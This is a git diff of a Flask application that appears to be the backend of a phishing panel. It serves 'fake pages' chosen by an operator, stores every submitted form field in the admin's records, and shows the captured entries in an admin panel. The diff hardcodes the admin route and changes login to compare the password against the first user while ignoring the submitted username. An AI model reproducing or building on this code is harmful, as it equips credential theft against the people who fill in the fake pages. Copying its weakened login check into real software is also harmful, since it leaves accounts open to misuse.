@@ -1,7 +1,7 @@
 from flask import render_template, request, redirect, flash
 from flask_login import current_user, login_user, login_required, logout_user
 
-from YAF import app, db, config
+from YAF import app, db
 from YAF.models import User
 from YAF.forms import PanelForm
 
@@ -19,20 +19,18 @@ FAKE_PAGES = {
 
 @app.route('/', methods=['GET', 'POST'])
 def main():
-    admin = User.query.filter_by(
-        username=config.get('admin', 'username')).first()
+    admin = User.query.first()
     if request.method == 'POST':
         admin.records = pprint.pformat(request.form, indent=4)
         db.session.commit()
 
-    return render_template(FAKE_PAGES.get(admin.current_page, 'boot.html'), admin_url=config.get('admin', 'admin_route'))
+    return render_template(FAKE_PAGES.get(admin.current_page, 'boot.html'), admin_url='/admin')
 
 
-@app.route(config.get('admin', 'admin_route'), methods=['GET', 'POST'])
+@app.route('/admin', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
-        user = User.query.filter_by(
-            username=request.form.get('username')).first()
+        user = User.query.first()
         if user and user.password == request.form.get('password'):
             login_user(user)
             return redirect('panel')
@@ -53,7 +51,7 @@ def panel():
     return render_template('admin/panel.html', form=form, records=current_user.records[::-1])
 
 
-@app.route(config.get('admin', 'admin_logout'))
+@app.route('/admin_logout')
 def logout():
     if current_user.is_authenticated:
         logout_user()
@@ -63,8 +61,7 @@ def logout():
 @app.route('/test', methods=['GET', 'POST'])
 def test():
     if request.method == 'POST':
-        admin = User.query.filter_by(
-            username=config.get('admin', 'username')).first()
+        admin = User.query.first()
         admin.records = pprint.pformat(request.form, indent=4)
         db.session.commit()
 
